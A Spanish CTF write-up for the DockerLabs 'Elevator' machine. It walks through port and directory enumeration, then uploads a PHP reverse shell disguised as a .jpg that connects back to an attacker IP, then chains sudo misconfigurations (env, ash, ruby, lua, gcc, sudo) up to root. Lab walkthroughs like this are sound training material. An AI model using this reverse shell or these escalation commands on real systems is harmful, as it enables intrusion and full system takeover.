---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Elevator DockerLabs (Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip elevator.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh elevator.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 04:09 EST
Nmap scan report for ctf403.hl (172.17.0.2)
Host is up (0.000043s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```

Si entramos en la pagina web que esta subida, no veremos gran cosa, por lo que intentaremos `fuzzear` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.php        (Status: 403) [Size: 275]
/.rhosts.txt          (Status: 403) [Size: 275]
/.listing.html        (Status: 403) [Size: 275]
/.passwd.php          (Status: 403) [Size: 275]
/.passwd.html         (Status: 403) [Size: 275]
/.ssh                 (Status: 403) [Size: 275]
/.perf.html           (Status: 403) [Size: 275]
/.perf                (Status: 403) [Size: 275]
/.ssh.txt             (Status: 403) [Size: 275]
/.listing             (Status: 403) [Size: 275]
/.ssh.html            (Status: 403) [Size: 275]
/.passwd              (Status: 403) [Size: 275]
/.ssh.php             (Status: 403) [Size: 275]
/.svn.php             (Status: 403) [Size: 275]
/.svn.html            (Status: 403) [Size: 275]
/.history             (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.web.html            (Status: 403) [Size: 275]
/.bashrc.txt          (Status: 403) [Size: 275]
/.perf.php            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.rhosts.php          (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.subversion          (Status: 403) [Size: 275]
/.web.php             (Status: 403) [Size: 275]
/.perf.txt            (Status: 403) [Size: 275]
/.svn                 (Status: 403) [Size: 275]
/.bash_history.php    (Status: 403) [Size: 275]
/.listing.php         (Status: 403) [Size: 275]
/.subversion.html     (Status: 403) [Size: 275]
/.bash_history.html   (Status: 403) [Size: 275]
/Entries              (Status: 403) [Size: 275]
/Entries.html         (Status: 403) [Size: 275]
/Entries.php          (Status: 403) [Size: 275]
/Entries.txt          (Status: 403) [Size: 275]
/.bash_history        (Status: 403) [Size: 275]
/Root                 (Status: 403) [Size: 275]
/.subversion.txt      (Status: 403) [Size: 275]
/.subversion.php      (Status: 403) [Size: 275]
/.cvs.txt             (Status: 403) [Size: 275]
/.cvs.php             (Status: 403) [Size: 275]
/.passwd.txt          (Status: 403) [Size: 275]
/.cvs.html            (Status: 403) [Size: 275]
/.profile.txt         (Status: 403) [Size: 275]
/.bashrc              (Status: 403) [Size: 275]
/.rhosts              (Status: 403) [Size: 275]
/.rhosts.html         (Status: 403) [Size: 275]
/.bash_history.txt    (Status: 403) [Size: 275]
/.cvsignore           (Status: 403) [Size: 275]
/.cvsignore.html      (Status: 403) [Size: 275]
/.forward.html        (Status: 403) [Size: 275]
/.cvsignore.php       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.svn.txt             (Status: 403) [Size: 275]
/.cvsignore.txt       (Status: 403) [Size: 275]
/.forward             (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.forward.txt         (Status: 403) [Size: 275]
/.history.html        (Status: 403) [Size: 275]
/.history.txt         (Status: 403) [Size: 275]
/.listing.txt         (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.profile.php         (Status: 403) [Size: 275]
/.profile             (Status: 403) [Size: 275]
/.cvs                 (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.bashrc.html         (Status: 403) [Size: 275]
/.web.txt             (Status: 403) [Size: 275]
/.history.php         (Status: 403) [Size: 275]
/.profile.html        (Status: 403) [Size: 275]
/.bashrc.php          (Status: 403) [Size: 275]
/.web                 (Status: 403) [Size: 275]
/.forward.php         (Status: 403) [Size: 275]
/cgi-bin/.php         (Status: 403) [Size: 275]
/cgi-bin/.txt         (Status: 403) [Size: 275]
/cgi-bin/.html        (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 5647]
/javascript           (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
/themes               (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que los ultimos resultados del `403` no suelen ser normales, por lo que `fuzzearemos` en el directorio `/themes`:

```shell
gobuster dir -u http://<IP>/themes -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/themes
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.subversion.php      (Status: 403) [Size: 275]
/.bash_history        (Status: 403) [Size: 275]
/.subversion.html     (Status: 403) [Size: 275]
/.subversion.txt      (Status: 403) [Size: 275]
/.svn.html            (Status: 403) [Size: 275]
/.passwd.txt          (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.profile.txt         (Status: 403) [Size: 275]
/.ssh.php             (Status: 403) [Size: 275]
/.perf.txt            (Status: 403) [Size: 275]
/.rhosts              (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.bash_history.php    (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.listing.txt         (Status: 403) [Size: 275]
/.bashrc.php          (Status: 403) [Size: 275]
/.listing.php         (Status: 403) [Size: 275]
/.bashrc.html         (Status: 403) [Size: 275]
/.listing.html        (Status: 403) [Size: 275]
/.bashrc              (Status: 403) [Size: 275]
/.listing             (Status: 403) [Size: 275]
/.bash_history.txt    (Status: 403) [Size: 275]
/.bash_history.html   (Status: 403) [Size: 275]
/.svn                 (Status: 403) [Size: 275]
/.web.txt             (Status: 403) [Size: 275]
/.web.php             (Status: 403) [Size: 275]
/.web.html            (Status: 403) [Size: 275]
/.bashrc.txt          (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.passwd.html         (Status: 403) [Size: 275]
/.perf                (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/Entries.txt          (Status: 403) [Size: 275]
/Entries              (Status: 403) [Size: 275]
/Entries.html         (Status: 403) [Size: 275]
/Entries.php          (Status: 403) [Size: 275]
/.history.php         (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.history.html        (Status: 403) [Size: 275]
/.history             (Status: 403) [Size: 275]
/Root                 (Status: 403) [Size: 275]
/.forward.php         (Status: 403) [Size: 275]
/.passwd.php          (Status: 403) [Size: 275]
/.forward.txt         (Status: 403) [Size: 275]
/.passwd              (Status: 403) [Size: 275]
/.forward.html        (Status: 403) [Size: 275]
/.svn.txt             (Status: 403) [Size: 275]
/.cvs.php             (Status: 403) [Size: 275]
/.cvs.html            (Status: 403) [Size: 275]
/.cvsignore           (Status: 403) [Size: 275]
/.cvsignore.txt       (Status: 403) [Size: 275]
/.cvs.txt             (Status: 403) [Size: 275]
/.rhosts.php          (Status: 403) [Size: 275]
/.ssh.txt             (Status: 403) [Size: 275]
/.web                 (Status: 403) [Size: 275]
/.perf.html           (Status: 403) [Size: 275]
/.svn.php             (Status: 403) [Size: 275]
/.perf.php            (Status: 403) [Size: 275]
/.ssh.html            (Status: 403) [Size: 275]
/.profile             (Status: 403) [Size: 275]
/.ssh                 (Status: 403) [Size: 275]
/.profile.php         (Status: 403) [Size: 275]
/.history.txt         (Status: 403) [Size: 275]
/.subversion          (Status: 403) [Size: 275]
/.forward             (Status: 403) [Size: 275]
/.rhosts.txt          (Status: 403) [Size: 275]
/.cvsignore.html      (Status: 403) [Size: 275]
/.profile.html        (Status: 403) [Size: 275]
/.cvs                 (Status: 403) [Size: 275]
/.rhosts.html         (Status: 403) [Size: 275]
/.cvsignore.php       (Status: 403) [Size: 275]
/archivo.html         (Status: 200) [Size: 3380]
/cgi-bin/.html        (Status: 403) [Size: 275]
/cgi-bin/.txt         (Status: 403) [Size: 275]
/cgi-bin/.php         (Status: 403) [Size: 275]
/upload.php           (Status: 200) [Size: 0]
/uploads              (Status: 200) [Size: 762]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay bastantes resultados interesantes, por lo que entraremos en la pagina llamada `/archivo.html`.

```
URL = http://<IP>/themes/archivo.html
```

## Escalate user www-data

Si entramos en dicha pagina veremos una web en la que podremos subir un archivo `.jpg`, por lo que intentaremos subir un `.php` camuflado para crearnos una `reverse shell`:

> shell.php.jpg

```php
<?php
$sock=fsockopen("192.168.5.186",7777);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ponemos esas extensiones al archivo `.php.jpg` para camuflarlo, y antes de enviar el archivo, nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora tendremos que subir el archivo y darle a `subir imagen`, si ahora nos volvemos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 42940
whoami
www-data
```

## Escalate user daphne

Ahora tendremos que sanitizar la shell (TTY).

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on f6a8d22ef0ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on f6a8d22ef0ec:
    (daphne) NOPASSWD: /usr/bin/env
```

Por lo que podremos ejecutar el binario `env` como el usuario `daphne`, por lo que haremos lo siguiente:

```shell
sudo -u daphne env /bin/sh
```

Y con esto seremos dicho usuario.

## Escalate user vilma

Primero pondremos `bash` para tener una shell de `bash` y tener una shell mucho mejor.

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for daphne on f6a8d22ef0ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User daphne may run the following commands on f6a8d22ef0ec:
    (vilma) NOPASSWD: /usr/bin/ash
```

Por lo que vemos podremos ejecutar ese binario `ash` como el usuario `vilma`, por lo que haremos lo siguiente:

```shell
sudo -u vilma ash
```

Y con esto seremos dicho usuario.

## Escalate user shaggy

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for vilma on f6a8d22ef0ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vilma may run the following commands on f6a8d22ef0ec:
    (shaggy) NOPASSWD: /usr/bin/ruby
```

Por lo que vemos podemos ejecutar el binario `ruby` como el usuario `shaggy`, por lo que haremos lo siguiente:

```shell
sudo -u shaggy ruby -e 'exec "/bin/sh"'
```

Y con esto seremos dicho usuario.

## Escalate user fred

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for shaggy on f6a8d22ef0ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User shaggy may run the following commands on f6a8d22ef0ec:
    (fred) NOPASSWD: /usr/bin/lua
```

Por lo que vemos podemos ejecutar el binario `lua` como el usuario `fred`, por lo que haremos lo siguiente:

```shell
sudo -u fred lua -e 'os.execute("/bin/sh")'
```

Y con esto seremos dicho usuario.

## Escalate user scooby

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for fred on f6a8d22ef0ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User fred may run the following commands on f6a8d22ef0ec:
    (scooby) NOPASSWD: /usr/bin/gcc
```

Por lo que vemos podemos ejecutar el binario `gcc` como el usuario `scooby`, por lo que haremos lo siguiente:

```shell
sudo -u scooby gcc -wrapper /bin/sh,-s .
```

Y con esto seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for scooby on f6a8d22ef0ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User scooby may run the following commands on f6a8d22ef0ec:
    (root) NOPASSWD: /usr/bin/sudo
```

Vemos que podremos ejecutar el binario `sudo` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo sudo /bin/bash
```

Y con esto ya seremos `root`, por lo que habremos terminado.
